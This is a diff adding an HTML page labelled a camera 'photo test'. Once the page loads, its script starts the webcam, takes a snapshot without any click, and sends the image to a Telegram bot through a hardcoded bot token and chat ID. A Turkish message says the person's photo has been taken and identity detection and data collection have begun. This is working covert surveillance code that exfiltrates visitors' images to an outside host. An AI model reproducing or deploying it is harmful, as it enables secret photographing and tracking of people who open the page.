@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PHOTO TEST</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; }
+        .test-btn { background: #ff0000; color: #fff; padding: 15px 30px; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; margin: 10px; }
+        .result { margin: 20px; padding: 15px; border: 1px solid #00ff00; }
+        video { border: 2px solid #ff0000; margin: 10px; }
+    </style>
+</head>
+<body>
+    <h1>🔥💀 CAMERA PHOTO TEST 💀🔥</h1>
+    
+    <button class="test-btn" onclick="startCameraTest()">
+        📷 START CAMERA TEST
+    </button>
+    
+    <button class="test-btn" onclick="captureAndSend()">
+        📸 CAPTURE & SEND PHOTO
+    </button>
+    
+    <div id="results" class="result">
+        Ready to test camera photo sending...
+    </div>
+    
+    <video id="video" width="320" height="240" autoplay muted></video>
+    <canvas id="canvas" width="320" height="240" style="border: 1px solid #00ff00;"></canvas>
+    
+    <script>
+        let stream = null;
+        let video = document.getElementById('video');
+        let canvas = document.getElementById('canvas');
+        let ctx = canvas.getContext('2d');
+        
+        function updateResult(msg) {
+            const results = document.getElementById('results');
+            results.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
+            console.log(msg);
+        }
+        
+        async function startCameraTest() {
+            updateResult('🔥 Starting camera test...');
+            
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: 320, height: 240 },
+                    audio: false
+                });
+                
+                video.srcObject = stream;
+                
+                video.addEventListener('loadedmetadata', () => {
+                    updateResult('✅ Camera stream loaded!');
+                    updateResult(`📹 Resolution: ${video.videoWidth}x${video.videoHeight}`);
+                    
+                    // Auto capture after 3 seconds
+                    setTimeout(() => {
+                        captureAndSend();
+                    }, 3000);
+                });
+                
+            } catch (error) {
+                updateResult(`❌ Camera error: ${error.message}`);
+            }
+        }
+        
+        async function captureAndSend() {
+            if (!stream) {
+                updateResult('❌ No camera stream available');
+                return;
+            }
+            
+            updateResult('📸 Capturing photo...');
+            
+            try {
+                // Draw video frame to canvas
+                ctx.drawImage(video, 0, 0, 320, 240);
+                
+                // Convert to blob
+                canvas.toBlob(async (blob) => {
+                    if (!blob) {
+                        updateResult('❌ Failed to create photo blob');
+                        return;
+                    }
+                    
+                    updateResult(`✅ Photo captured! Size: ${(blob.size / 1024).toFixed(1)}KB`);
+                    
+                    // Test photo sending
+                    await sendPhotoToTelegram(blob);
+                    
+                }, 'image/jpeg', 0.9);
+                
+            } catch (error) {
+                updateResult(`❌ Capture error: ${error.message}`);
+            }
+        }
+        
+        async function sendPhotoToTelegram(photoBlob) {
+            updateResult('📡 Sending photo to telegram...');
+            
+            try {
+                const BOT_TOKEN = '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM';
+                const CHAT_ID = '6633612153';
+                
+                // First send text message
+                const photoMsg = `📷🔍 RESİM ATMIYO AMCIK - DEBUG TEST! 🔍📷
+
+👥 Şahıs resmi alındı, gerekli araştırılmaya başlandı.
+🔎 Profil analizi ve kimlik tespiti yapılıyor.
+📊 Veri toplama işlemi aktif durumda.
+
+📄 Test Details:
+• Photo Size: ${(photoBlob.size / 1024).toFixed(1)}KB
+• Format: JPEG
+• Resolution: 320x240
+• Time: ${new Date().toLocaleString()}
+
+🔒 Güvenlik Protokolü: AKTİF
+🔍 Debug Test: PHOTO SENDING TEST`;
+                
+                // Send message first
+                const msgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: photoMsg
+                    })
+                });
+                
+                if (msgResponse.ok) {
+                    updateResult('✅ Message sent successfully');
+                } else {
+                    updateResult(`❌ Message failed: ${msgResponse.status}`);
+                }
+                
+                // Send photo
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photoBlob, 'debug-photo.jpg');
+                formData.append('caption', 'Debug Photo - Şahıs Fotoğrafı Test');
+                
+                const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (photoResponse.ok) {
+                    updateResult('✅ PHOTO SENT SUCCESSFULLY!');
+                    const result = await photoResponse.json();
+                    updateResult(`📄 Response: ${JSON.stringify(result.ok)}`);
+                } else {
+                    updateResult(`❌ Photo send failed: ${photoResponse.status}`);
+                    const errorText = await photoResponse.text();
+                    updateResult(`📄 Error details: ${errorText}`);
+                }
+                
+            } catch (error) {
+                updateResult(`❌ Telegram send error: ${error.message}`);
+            }
+        }
+        
+        // Auto start test after 2 seconds
+        setTimeout(() => {
+            updateResult('🚀 Auto-starting camera test...');
+            startCameraTest();
+        }, 2000);
+    </script>
+</body>
+</html>
